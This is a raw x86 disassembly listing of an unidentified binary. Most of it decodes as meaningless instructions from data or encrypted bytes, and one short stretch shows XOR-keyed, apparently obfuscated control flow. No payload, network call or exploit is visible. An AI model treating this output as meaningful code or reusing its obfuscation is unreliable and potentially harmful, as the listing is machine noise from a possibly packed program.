  41ecb8:	pop    ds
  41ecb9:	mov    dh,0x1
  41ecbb:	sbb    BYTE PTR [edi+0x5636e0bf],dh
  41ecc1:	je     0x41ecaa
  41ecc3:	pop    esi
  41ecc4:	xor    ecx,DWORD PTR [edi-0x47c28949]
  41ecca:	or     BYTE PTR [edx],bh
  41eccc:	(bad)  
  41eccd:	push   ecx
  41ecce:	xchg   edi,eax
  41eccf:	adc    edi,DWORD PTR [ebp-0x3f]
  41ecd2:	es pusha 
  41ecd4:	int    0x4b
  41ecd6:	in     eax,dx
  41ecd7:	pop    ebx
  41ecd8:	outs   dx,DWORD PTR ds:[esi]
  41ecd9:	daa    
  41ecda:	(bad)
  41ecde:	into   
  41ecdf:	xlat   BYTE PTR ds:[ebx]
  41ece0:	and    bl,BYTE PTR ss:[ecx+0x6a4de4e7]
  41ece7:	popf   
  41ece8:	js     0x41ecb3
  41ecea:	and    al,ah
  41ecec:	out    0xcf,eax
  41ecee:	nop
  41ecef:	jp     0x41ecd2
  41ecf1:	inc    ebx
  41ecf2:	sub    edi,DWORD PTR [ecx+0x6c]
  41ecf5:	(bad)  
  41ecf6:	mov    ah,0xf9
  41ecf8:	daa    
  41ecf9:	jmp    0xeac1fb4f
  41ecfe:	pushf  
  41ecff:	xor    ch,BYTE PTR [esi]
  41ed01:	shl    BYTE PTR [ebx+ecx*2],cl
  41ed04:	dec    ebp
  41ed05:	mov    cs,WORD PTR [ebx]
  41ed07:	ds out 0xa4,eax
  41ed0a:	fist   DWORD PTR ds:0x2a5310d1
  41ed10:	fcmovne st,st(0)
  41ed12:	pop    esp
  41ed13:	pop    esp
  41ed14:	jae    0x41ed7f
  41ed16:	arpl   WORD PTR [eax],di
  41ed18:	xor    esi,DWORD PTR [esi]
  41ed1a:	adc    esi,edx
  41ed1c:	ins    DWORD PTR es:[edi],dx
  41ed1d:	rcl    BYTE PTR [ecx-0x7d],cl
  41ed20:	addr16 inc edi
  41ed22:	imul   edi,DWORD PTR [ecx],0xffffffa0
  41ed25:	test   ebx,0x54c5f47f
  41ed2b:	int3   
  41ed2c:	mov    esi,0xecada0a2
  41ed31:	sub    BYTE PTR [edi+0x28a2c387],cl
  41ed37:	push   0xdc00f3b
  41ed3c:	(bad)  
  41ed3d:	stos   DWORD PTR es:[edi],eax
  41ed3e:	sbb    al,0xbe
  41ed40:	mov    ah,0x7
  41ed42:	sub    DWORD PTR gs:[ebx-0xf],edx
  41ed46:	or     BYTE PTR [esi+ecx*4-0x2a36baf2],ch
  41ed4d:	fwait
  41ed4e:	inc    esi
  41ed4f:	push   edx
  41ed50:	fbld   TBYTE PTR [eax]
  41ed52:	es pop es
  41ed54:	in     al,dx
  41ed55:	mov    ah,0xa5
  41ed57:	dec    edi
  41ed58:	ins    DWORD PTR es:[edi],dx
  41ed59:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed5b:	test   BYTE PTR [edi+0x12aa99de],0x1c
  41ed62:	pop    ss
  41ed63:	adc    edi,0xffffffb6
  41ed66:	sub    dh,BYTE PTR [esi]
  41ed68:	dec    eax
  41ed69:	rcr    DWORD PTR [esi-0x3f],1
  41ed6c:	mov    esp,0xebf929f1
  41ed71:	rol    bl,cl
  41ed73:	jo     0x41ed58
  41ed75:	daa    
  41ed76:	idiv   edi
  41ed78:	add    ch,bh
  41ed7a:	add    eax,0xa70af400
  41ed7f:	pop    es
  41ed80:	xchg   BYTE PTR [eax],ah
  41ed82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed83:	dec    eax
  41ed84:	push   ds
  41ed85:	mov    BYTE PTR [eax+0x5a80c550],cl
  41ed8b:	outs   dx,BYTE PTR ds:[esi]
  41ed8c:	and    DWORD PTR [ebx+0x6b1b55ee],ecx
  41ed92:	add    al,0x58
  41ed94:	into   
  41ed95:	int3   
  41ed96:	mov    ds:0xe8a69a7d,eax
  41ed9b:	mov    ecx,0x568d3e2e
  41eda0:	or     ecx,ebx
  41eda2:	lds    ecx,FWORD PTR [edi+0x532326ef]
  41eda8:	jnp    0x41edcf
  41edaa:	push   ebp
  41edab:	cdq    
  41edac:	jns    0x41ed40
  41edae:	or     BYTE PTR [eax-0xb],0x92
  41edb2:	add    edx,DWORD PTR [eax-0x47]
  41edb5:	aad    0xa
  41edb7:	dec    ecx
  41edb8:	or     al,0x24
  41edba:	repz xchg esi,eax
  41edbc:	popa   
  41edbd:	add    esi,DWORD PTR ds:0xf60c0bcb
  41edc3:	stc    
  41edc4:	enter  0x1,0xb1
  41edc8:	pop    edi
  41edc9:	hlt    
  41edca:	jecxz  0x41edff
  41edcc:	cmp    cl,BYTE PTR [eax+0xce1d0df]
  41edd2:	out    dx,al
  41edd3:	xchg   edi,eax
  41edd4:	and    bl,dh
  41edd6:	sbb    al,0x73
  41edd8:	jmp    0x41ed97
  41edda:	(bad)
  41eddf:	ret    
  41ede0:	mov    ah,0x3
  41ede2:	pop    ds
  41ede3:	fwait
  41ede4:	mov    al,ch
  41ede6:	push   ecx
  41ede7:	pop    edi
  41ede8:	inc    ebp
  41ede9:	imul   eax,DWORD PTR [edi],0x50
  41edec:	bswap  edx
  41edee:	std    
  41edef:	pop    eax
  41edf0:	pop    ebx
  41edf1:	mov    al,ds:0x9e8bf75a
  41edf6:	and    ecx,DWORD PTR [ebx]
  41edf8:	dec    ebx
  41edf9:	mov    WORD PTR cs:[bp+di+0x7ec4],?
  41edff:	sbb    DWORD PTR [ebx-0x470d92f7],0xffffffb9
  41ee06:	xchg   BYTE PTR [edi+0x43],dh
  41ee09:	int3   
  41ee0a:	stos   DWORD PTR es:[edi],eax
  41ee0b:	out    dx,eax
  41ee0c:	add    eax,0x1ef5eba6
  41ee11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee12:	loope  0x41ee7f
  41ee14:	into   
  41ee15:	aas    
  41ee16:	repz and DWORD PTR [esi-0x5b],ebx
  41ee1a:	jno    0x41edf6
  41ee1c:	mov    BYTE PTR [esi],bl
  41ee1e:	jle    0x41edee
  41ee20:	dec    ecx
  41ee21:	enter  0x53d4,0x5a
  41ee25:	sbb    BYTE PTR [ecx+ecx*2],cl
  41ee28:	or     al,0x9b
  41ee2a:	cld    
  41ee2b:	xchg   ebp,eax
  41ee2c:	rcl    al,cl
  41ee2e:	mov    ebx,0x34316015
  41ee33:	inc    edi
  41ee34:	aaa    
  41ee35:	hlt    
  41ee36:	iret   
  41ee37:	cmp    eax,0xc50e2f4e
  41ee3c:	dec    ebx
  41ee3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee3e:	int    0x4b
  41ee40:	push   0xf4d379ab
  41ee45:	mov    bl,0x69
  41ee47:	in     al,dx
  41ee48:	ins    DWORD PTR es:[edi],dx
  41ee49:	sbb    eax,0x4ed79dff
  41ee4e:	cwde   
  41ee4f:	inc    edi
  41ee50:	jecxz  0x41eeba
  41ee52:	dec    esi
  41ee53:	(bad)  
  41ee54:	cdq    
  41ee55:	and    BYTE PTR [ebx+edi*2],al
  41ee58:	(bad)  
  41ee59:	fwait
  41ee5a:	daa    
  41ee5b:	in     eax,0xd0
  41ee5d:	ficomp DWORD PTR [edx+ebx*8-0x4d95c2ac]
  41ee64:	cmp    DWORD PTR [edx+0x1c],esi
  41ee67:	hlt    
  41ee68:	loope  0x41ee0c
  41ee6a:	xor    ah,dh
  41ee6c:	lahf   
  41ee6d:	js     0x41ee56
  41ee6f:	in     eax,0xac
  41ee71:	mov    ch,0xd2
  41ee73:	fcomp  QWORD PTR [edi]
  41ee75:	mov    ?,WORD PTR [esi+0x48cea6d1]
  41ee7b:	je     0x41eee0
  41ee7d:	mov    ?,ecx
  41ee7f:	(bad)  
  41ee80:	push   ss
  41ee81:	outs   dx,DWORD PTR ds:[esi]
  41ee82:	jmp    0x7d6e:0xe4d1a790
  41ee89:	ret    
  41ee8a:	and    dh,ch
  41ee8c:	(bad)  
  41ee8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee8e:	jp     0x41eec3
  41ee90:	scas   eax,DWORD PTR es:[edi]
  41ee91:	hlt    
  41ee92:	out    0x62,al
  41ee94:	push   ebx
  41ee95:	out    0x9b,al
  41ee97:	mov    ch,0x81
  41ee99:	repz out 0x7d,al
  41ee9c:	or     al,0x23
  41ee9e:	ins    DWORD PTR es:[edi],dx
  41ee9f:	test   DWORD PTR [edx],esi
  41eea1:	aas    
  41eea2:	mov    ch,0x8f
  41eea4:	aaa    
  41eea5:	xor    eax,0x47ae0906
  41eeaa:	fld    DWORD PTR [ebx]
  41eeac:	pop    ebp
  41eead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeae:	and    ch,BYTE PTR [ebx+0x70c08dc3]
  41eeb4:	icebp  
  41eeb5:	xchg   ebx,eax
  41eeb6:	js     0x41ee76
  41eeb8:	adc    al,0x40
  41eeba:	scas   al,BYTE PTR es:[edi]
  41eebb:	outs   dx,DWORD PTR ds:[esi]
  41eebc:	adc    esp,edi
  41eebe:	clc    
  41eebf:	jnp    0x41ee5d
  41eec1:	mov    edx,0x51765b32
  41eec6:	je     0x41eef8
  41eec8:	pop    ecx
  41eec9:	add    DWORD PTR [edx+0x20],0xffffffb9
  41eecd:	sti    
  41eece:	or     eax,DWORD PTR ds:[ecx+eiz*4-0x60]
  41eed3:	add    DWORD PTR [edi],edx
  41eed5:	dec    edx
  41eed6:	scas   al,BYTE PTR es:[edi]
  41eed7:	outs   dx,BYTE PTR ds:[esi]
  41eed8:	outs   dx,DWORD PTR ds:[esi]
  41eed9:	js     0x41ee8a
  41eedb:	and    BYTE PTR ds:0x58070b2f,ah
  41eee1:	add    DWORD PTR [ebp+0x3945f925],ecx
  41eee7:	adc    bh,BYTE PTR [edi]
  41eee9:	cmp    al,0xaa
  41eeeb:	out    0xf3,al
  41eeed:	ins    BYTE PTR es:[edi],dx
  41eeee:	loopne 0x41ee9f
  41eef0:	pop    ds
  41eef1:	and    eax,0x710b2645
  41eef6:	lahf   
  41eef7:	aaa    
  41eef8:	pop    ecx
  41eef9:	scas   eax,DWORD PTR es:[edi]
  41eefa:	outs   dx,BYTE PTR ds:[esi]
  41eefb:	push   edi
  41eefc:	jge    0x41eea3
  41eefe:	sub    DWORD PTR [edi-0x39c5ae9e],ebp
  41ef04:	in     al,dx
  41ef05:	out    0xb9,eax
  41ef07:	(bad)  
  41ef08:	arpl   WORD PTR [ecx],ax
  41ef0a:	mov    eax,ds:0xe3141b11
  41ef0f:	jle    0x41ee94
  41ef11:	inc    eax
  41ef12:	pop    es
  41ef13:	push   ss
  41ef14:	mov    ds:0x2aa8d9e4,al
  41ef19:	imul   edi,ebx,0xaebe213e
  41ef1f:	dec    edi
  41ef20:	ins    BYTE PTR es:[edi],dx
  41ef21:	jae    0x41ef0e
  41ef23:	pop    eax
  41ef24:	jecxz  0x41eeaa
  41ef26:	inc    esi
  41ef27:	jae    0x41eed0
  41ef29:	mov    es,WORD PTR [esi-0x513f2f5a]
  41ef2f:	ss mov edi,0x4e1a389e
  41ef35:	mov    edx,0xb2012c51
  41ef3a:	and    eax,0xdbe4cd99
  41ef3f:	pop    ebp
  41ef40:	sbb    ch,BYTE PTR [edi+ebp*4]
  41ef43:	lea    eax,[edi+ebx*8-0x67]
  41ef47:	fistp  QWORD PTR [ecx-0x7f]
  41ef4a:	mov    cl,0xb2
  41ef4c:	jne    0x41eedb
  41ef4e:	mov    al,ds:0x1e0b2f46
  41ef53:	ds mov cl,0x9e
  41ef56:	es div esp
  41ef59:	repz add DWORD PTR [edx],ebp
  41ef5c:	mov    cl,0xce
  41ef5e:	xlat   BYTE PTR ds:[ebx]
  41ef5f:	sub    BYTE PTR [edi+eax*1+0x354445e4],dh
  41ef66:	push   0x25b74624
  41ef6b:	fnstenv [ecx]
  41ef6d:	fs aad 0x8f
  41ef70:	dec    eax
  41ef71:	xchg   ebp,eax
  41ef72:	pop    esp
  41ef73:	test   dl,dl
  41ef75:	add    eax,0x15cc03c8
  41ef7a:	jl     0x41efa0
  41ef7c:	neg    BYTE PTR [edx]
  41ef7e:	mov    esi,0xce76725e
  41ef83:	jnp    0x41efa5
  41ef85:	jns    0x41ef3d
  41ef87:	xchg   edi,eax
  41ef88:	pusha  
  41ef89:	cli    
  41ef8a:	jns    0x41ef86
  41ef8c:	stc    
  41ef8d:	bound  ebp,QWORD PTR [ebx-0x75]
  41ef90:	mov    eax,0x12d53ba3
  41ef95:	dec    edx
  41ef96:	scas   eax,DWORD PTR es:[edi]
  41ef97:	lods   al,BYTE PTR ds:[esi]
  41ef98:	dec    eax
  41ef99:	test   ebx,ebp
  41ef9b:	sbb    ebx,DWORD PTR [ebp+0x62]
  41ef9e:	or     al,0x68
  41efa0:	jecxz  0x41efc2
  41efa2:	xchg   esp,eax
  41efa3:	xchg   ebx,eax
  41efa4:	mov    bh,0xcc
  41efa6:	cld    
  41efa7:	mov    dh,0x95
  41efa9:	out    dx,al
  41efaa:	sub    al,0x7e
  41efac:	(bad)  
  41efad:	test   cl,0xed
  41efb0:	enter  0x97c4,0x8a
  41efb4:	jnp    0x41ef39
  41efb6:	jno    0x41ef7d
  41efb8:	mov    eax,fs
  41efba:	push   esp
  41efbb:	mov    ds:0x63794123,eax
  41efc0:	jnp    0x41f015
  41efc2:	loope  0x41efa5
  41efc4:	mov    edx,0xd6b18c78
  41efc9:	loopne 0x41ef7a
  41efcb:	mov    edi,0xf42d273b
  41efd0:	inc    ecx
  41efd1:	xor    DWORD PTR [eax],esp
  41efd3:	mov    bl,0xb7
  41efd5:	(bad)  
  41efd6:	repz gs xchg edi,eax
  41efd9:	out    dx,al
  41efda:	adc    al,0xb3
  41efdc:	ins    DWORD PTR es:[edi],dx
  41efdd:	lea    esp,[esi+ecx*1-0x3e]
  41efe1:	pop    edi
  41efe2:	jmp    0x4267a32f
  41efe7:	mov    dh,ch
  41efe9:	ret    0x1e5b
  41efec:	jns    0x41ef8a
  41efee:	mov    eax,0x7b7d58cf
  41eff3:	fld    QWORD PTR [edi]
  41eff5:	jmp    0x5a8a7224
  41effa:	push   ebp
  41effb:	inc    esp
  41effc:	sub    ecx,DWORD PTR [ebp+0x33]
  41efff:	enter  0xce03,0xf
  41f003:	test   DWORD PTR [ebx-0x24],esp
  41f006:	(bad)  
  41f007:	dec    DWORD PTR [ebx+0x4d89f44d]
  41f00d:	or     cl,ch
  41f00f:	sub    eax,0x8b000000
  41f014:	dec    ebp
  41f015:	or     BYTE PTR [ebx-0x37cc07ab],cl
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x5b256403
  41f0bf:	dec    eax
  41f0c0:	sbb    al,0x51
  41f0c2:	fsub   DWORD PTR [ecx+0x62]
  41f0c5:	cmp    al,0x5f
  41f0c7:	bound  esp,QWORD PTR [edx-0x3c]
  41f0ca:	(bad)  
  41f0cb:	fs inc eax
  41f0cd:	lods   al,BYTE PTR ds:[esi]
  41f0ce:	mov    bl,0xce
  41f0d0:	push   0xffffffd8
  41f0d2:	push   0x771dfb0
  41f0d7:	push   edi
  41f0d8:	jmp    0x758c:0x3890c706
  41f0df:	mov    bl,0x9
  41f0e1:	add    BYTE PTR [edi],ah
  41f0e3:	in     eax,0x79
  41f0e5:	repz retf 0x265b
  41f0e9:	or     DWORD PTR [ebx],0xe462d86c
  41f0ef:	jmp    0x41f0d5
  41f0f1:	xor    al,BYTE PTR [ebp+0x68]
  41f0f4:	dec    edx
  41f0f5:	xchg   edx,eax
  41f0f6:	fs mov edi,0x194d7644
  41f0fc:	enter  0xa222,0x18
  41f100:	mov    BYTE PTR [edx+edi*2-0xc],dh
  41f104:	inc    si
  41f106:	adc    DWORD PTR [ebp-0x44],ebp
  41f109:	pop    ecx
  41f10a:	push   edi
  41f10b:	xor    ecx,DWORD PTR [ebx+0x68]
  41f10e:	jmp    0x41f15a
  41f110:	xchg   ebp,eax
  41f111:	sbb    edi,ebx
  41f113:	scas   eax,DWORD PTR es:[edi]
  41f114:	push   cs
  41f115:	mov    al,ds:0xcbad2b52
  41f11a:	aad    0x43
  41f11c:	mov    ecx,edi
  41f11e:	(bad)  
  41f11f:	cmc    
  41f120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f121:	inc    eax
  41f122:	mov    al,0xd6
  41f124:	es dec eax
  41f126:	(bad)  
  41f127:	(bad)  
  41f128:	arpl   WORD PTR [edi+edi*2+0x66e88c7e],ax
  41f12f:	xor    edx,eax
  41f131:	xchg   edi,eax
  41f132:	movaps XMMWORD PTR [edx-0x6edbbabf],xmm0
  41f139:	inc    esi
  41f13a:	push   es
  41f13b:	jle    0x41f169
  41f13d:	frstor [ebx+edx*4-0x33]
  41f141:	test   al,0x6c
  41f143:	sti    
  41f144:	dec    eax
  41f145:	jl     0x41f190
  41f147:	inc    edi
  41f148:	sbb    bh,dh
  41f14a:	cmc    
  41f14b:	mov    dl,0x5d
  41f14d:	push   0xffffffc9
  41f14f:	xchg   cl,ch
  41f151:	inc    ebx
  41f152:	mov    edx,0xa72cd717
  41f157:	jb     0x41f105
  41f159:	mov    cl,0x87
  41f15b:	dec    ebx
  41f15c:	arpl   WORD PTR [eax],sp
  41f15e:	in     eax,dx
  41f15f:	adc    BYTE PTR [ebx-0x2e],dl
  41f162:	ret    0x87ae
  41f165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f166:	cmp    dh,dh
  41f168:	jle    0x41f151
  41f16a:	shl    cl,0x54
  41f16d:	adc    BYTE PTR [edi-0x9],dh
  41f170:	inc    ecx
  41f171:	dec    edx
  41f172:	and    ebp,eax
  41f174:	adc    ebp,DWORD PTR ds:0x827dffd0
  41f17a:	xor    al,0x8e
  41f17c:	out    0xf4,al
  41f17e:	sub    DWORD PTR [edx+edx*4],ebx
  41f181:	adc    ah,BYTE PTR [ecx-0x2a892578]
  41f187:	aas    
  41f188:	ins    DWORD PTR es:[edi],dx
  41f189:	cmp    bl,cl
  41f18b:	inc    eax
  41f18c:	call   0xc2ebea92
  41f191:	push   ebx
  41f192:	sbb    bh,BYTE PTR [edi-0x5c292867]
  41f198:	repz push ecx
  41f19a:	jmp    0xc44a9466
  41f19f:	mov    ebp,0xb18716c2
  41f1a4:	arpl   bx,bx
  41f1a6:	repnz icebp 
  41f1a8:	jl     0x41f13a
  41f1aa:	out    dx,al
  41f1ab:	and    al,0xd
  41f1ad:	int    0xd5
  41f1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1b0:	pop    ecx
  41f1b1:	mov    BYTE PTR [ebx+0x593e846d],ah
  41f1b7:	bound  eax,QWORD PTR [ebx-0x3f]
  41f1ba:	jae    0x41f15d
  41f1bc:	loop   0x41f22f
  41f1be:	les    edx,FWORD PTR [ebx+ecx*4]
  41f1c1:	adc    DWORD PTR [ebx+0x13],ecx
  41f1c4:	(bad)  
  41f1c5:	retf   
  41f1c6:	arpl   WORD PTR [ebx-0x5a24dca0],sp
  41f1cc:	iret   
  41f1cd:	(bad)  
  41f1ce:	neg    DWORD PTR [ebp-0x7c77eee]
  41f1d4:	jo     0x41f1ea
  41f1d6:	pop    ebp
  41f1d7:	leave  
  41f1d8:	add    eax,0x1ad7f80d
  41f1dd:	inc    ebx
  41f1de:	stos   BYTE PTR es:[edi],al
  41f1df:	xor    DWORD PTR [eax-0x25],edi
  41f1e2:	mov    DWORD PTR [eax],ebx
  41f1e4:	mov    esp,0x47ef4cde
  41f1e9:	loopne 0x41f259
  41f1eb:	cwde   
  41f1ec:	in     al,dx
  41f1ed:	lock fst QWORD PTR [ebx-0x21]
  41f1f1:	cli    
  41f1f2:	xchg   ecx,eax
  41f1f3:	or     ecx,0x4d
  41f1f6:	xchg   BYTE PTR [esi+0x598c5172],cl
  41f1fc:	sbb    DWORD PTR [edi],esp
  41f1fe:	sbb    BYTE PTR [eax+eiz*8],0x9c
  41f202:	push   0xf6cb3fb0
  41f207:	call   FWORD PTR [ecx+0x3bae302f]
  41f20d:	mov    eax,0x55bb6337
  41f212:	lahf   
  41f213:	sar    BYTE PTR ss:[esi],cl
  41f216:	jle    0x41f211
  41f218:	mov    al,ds:0xf0432d83
  41f21d:	pop    es
  41f21e:	push   ebp
  41f21f:	pop    edi
  41f220:	pop    ebp
  41f221:	mov    al,0xda
  41f223:	in     al,dx
  41f224:	fsubp  st(1),st
  41f226:	ja     0x41f1d7
  41f228:	sbb    ebx,DWORD PTR [edx-0x67]
  41f22b:	push   esi
  41f22c:	jnp    0x41f1ee
  41f22e:	int    0x61
  41f230:	or     BYTE PTR [ebx-0x37],dh
  41f233:	fnstsw WORD PTR [ecx+0x47]
  41f236:	xlat   BYTE PTR ds:[ebx]
  41f237:	pop    eax
  41f238:	int    0xcb
  41f23a:	aad    0x97
  41f23c:	lds    ebp,FWORD PTR [edi]
  41f23e:	les    ebx,FWORD PTR [ebp+0x36]
  41f241:	mov    edi,0x7bca5be6
  41f246:	pop    ss
  41f247:	fidiv  WORD PTR [edx+eax*1+0x3b]
  41f24b:	fidivr DWORD PTR [edx+eax*2]
  41f24e:	popf   
  41f24f:	or     edi,DWORD PTR [esi-0x676c5dd5]
  41f255:	or     DWORD PTR fs:[eax+0x53],ebp
  41f259:	loop   0x41f20a
  41f25b:	arpl   WORD PTR [ebx-0xd],bx
  41f25e:	adc    al,0xf4
  41f260:	mov    al,ds:0xea1b0cb2
  41f265:	lods   al,BYTE PTR ds:[esi]
  41f266:	mov    ecx,0xadf7a57f
  41f26b:	ret    
  41f26c:	push   edi
  41f26d:	jo     0x41f29a
  41f26f:	push   esp
  41f270:	cli    
  41f271:	jne    0x41f2c8
  41f273:	add    al,BYTE PTR [edi-0x37]
  41f276:	pop    esp
  41f277:	ficom  WORD PTR [ebx+0x560cf10b]
  41f27d:	mov    ebp,0x2b9705ba
  41f282:	dec    ebx
  41f283:	inc    esi
  41f284:	or     al,0x10
  41f286:	or     DWORD PTR [ebx-0x78],ebp
  41f289:	xchg   ecx,eax
  41f28a:	mov    ah,0x78
  41f28c:	cmp    al,0xf6
  41f28e:	cmp    al,0xa9
  41f290:	push   ds
  41f291:	stos   DWORD PTR es:[edi],eax
  41f292:	push   ebp
  41f293:	mov    edi,0xfdb7bad2
  41f298:	pop    edx
  41f299:	push   es
  41f29a:	push   edx
  41f29b:	jbe    0x41f243
  41f29d:	mov    ch,cl
  41f29f:	sub    al,dh
  41f2a1:	out    dx,al
  41f2a2:	cs inc eax
  41f2a4:	dec    ebx
  41f2a5:	mov    ebp,0x2a2fbdfd
  41f2aa:	mov    eax,ds:0x2d39c715
  41f2af:	bound  eax,QWORD PTR [ebp-0x77]
  41f2b2:	cmp    cl,dl
  41f2b4:	adc    eax,DWORD PTR [edx]
  41f2b6:	xor    BYTE PTR [edi-0x4492173],bl
  41f2bc:	clc    
  41f2bd:	je     0x41f33b
  41f2bf:	rol    ch,1
  41f2c1:	mov    dl,0xd3
  41f2c3:	push   ds
  41f2c4:	nop
  41f2c5:	dec    eax
  41f2c6:	aas    
  41f2c7:	mov    al,0x2d
  41f2c9:	sbb    ah,BYTE PTR [ebx]
  41f2cb:	mov    dh,0xb4
  41f2cd:	dec    edi
  41f2ce:	outs   dx,BYTE PTR ds:[esi]
  41f2cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2d0:	loope  0x41f289
  41f2d2:	inc    eax
  41f2d3:	js     0x41f2db
  41f2d5:	or     bl,BYTE PTR [esi+0x63c7619c]
  41f2db:	out    0x72,al
  41f2dd:	hlt    
  41f2de:	outs   dx,BYTE PTR ds:[esi]
  41f2df:	sbb    DWORD PTR [ebx+0x7f6a6f81],0x2c
  41f2e6:	scas   eax,DWORD PTR es:[edi]
  41f2e7:	je     0x41f290
  41f2e9:	mov    ebx,0x68da456f
  41f2ee:	daa    
  41f2ef:	push   cs
  41f2f0:	aam    0xc3
  41f2f2:	sbb    ecx,DWORD PTR [esi-0x265c5331]
  41f2f8:	in     eax,dx
  41f2f9:	call   0x39bf04f4
  41f2fe:	pop    ebx
  41f2ff:	inc    ebp
  41f300:	sub    eax,0x6d9c84e9
  41f305:	(bad)  
  41f307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f308:	or     ecx,edx
  41f30a:	les    edi,FWORD PTR [edi+ebx*1]
  41f30d:	mov    edi,0x2009b307
  41f312:	sbb    al,0xbf
  41f314:	sbb    bl,BYTE PTR [ecx+ecx*2-0x5c]
  41f318:	xchg   esi,eax
  41f319:	push   cs
  41f31a:	pop    edi
  41f31b:	addr16 push ds
  41f31d:	aas    
  41f31e:	and    eax,0xc10cd777
  41f323:	jg     0x41f302
  41f325:	popa   
  41f326:	lods   eax,DWORD PTR ds:[esi]
  41f327:	leave  
  41f328:	imul   edi,ebx,0xfe759f3
  41f32e:	push   0x3
  41f330:	xchg   BYTE PTR [ebp+0x586edd67],bl
  41f336:	mov    esi,DWORD PTR [ebp-0x6a0aabf6]
  41f33c:	lds    ebx,FWORD PTR [edx-0x2c]
  41f33f:	xor    DWORD PTR [esi],0xffffffe5
  41f342:	fisub  DWORD PTR [edx+0x29]
  41f345:	mov    esi,0x83fef77f
  41f34a:	jo     0x41f39d
  41f34c:	int    0x11
  41f34e:	and    DWORD PTR [esi-0x1dccc83e],0xffffff9a
  41f355:	mov    ch,0x2c
  41f357:	sub    al,0xba
  41f359:	inc    esi
  41f35a:	sahf   
  41f35b:	outs   dx,DWORD PTR ds:[esi]
  41f35c:	sub    DWORD PTR [esi+edi*8],edx
  41f35f:	loope  0x41f3ca
  41f361:	adc    DWORD PTR ss:[esp+ebp*4-0x30],0xffffffd7
  41f367:	dec    eax
  41f368:	sbb    eax,0x6cc58f71
  41f36d:	iret   
  41f36e:	jne    0x41f3ba
  41f370:	into   
  41f371:	jae    0x41f2f8
  41f373:	loop   0x41f3f0
  41f375:	mov    esp,DWORD PTR [edi]
  41f377:	out    0x59,al
  41f379:	nop
  41f37a:	push   ss
  41f37b:	ret    0x23de
  41f37e:	jo     0x41f352
  41f380:	cwde   
  41f381:	out    0x14,eax
  41f383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f384:	push   0xc812eee5
  41f389:	imul   BYTE PTR [esi-0x18]
  41f38c:	sar    BYTE PTR ds:0x8b0a9f8c,cl
  41f392:	adc    al,0x3d
  41f394:	push   ebx
  41f395:	pop    es
  41f396:	arpl   WORD PTR [ecx+ebx*4+0x1c],di
  41f39a:	mov    esi,0xe9e7ca36
  41f39f:	sub    eax,edx
  41f3a1:	imul   ebx,DWORD PTR [edx+0x4d],0x7a0b9221
  41f3a8:	adc    eax,0xc049b748
  41f3ad:	mov    BYTE PTR [edx-0x78],ch
  41f3b0:	sbb    BYTE PTR [edx],al
  41f3b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3b3:	fisubr WORD PTR [ebp+0x5b62d6b5]
  41f3b9:	mov    ecx,0x8ca49ae8
  41f3be:	dec    edi
  41f3bf:	sub    DWORD PTR [eax+0x1e],esi
  41f3c2:	mov    DWORD PTR [ecx],edi
  41f3c4:	or     BYTE PTR [ebx-0x5c],bl
  41f3c7:	test   esp,ecx
  41f3c9:	fld    TBYTE PTR [ebp+eax*2+0x11061cdb]
  41f3d0:	fs xchg bp,ax
  41f3d3:	dec    ecx
  41f3d4:	mov    ds:0xa579fde6,al
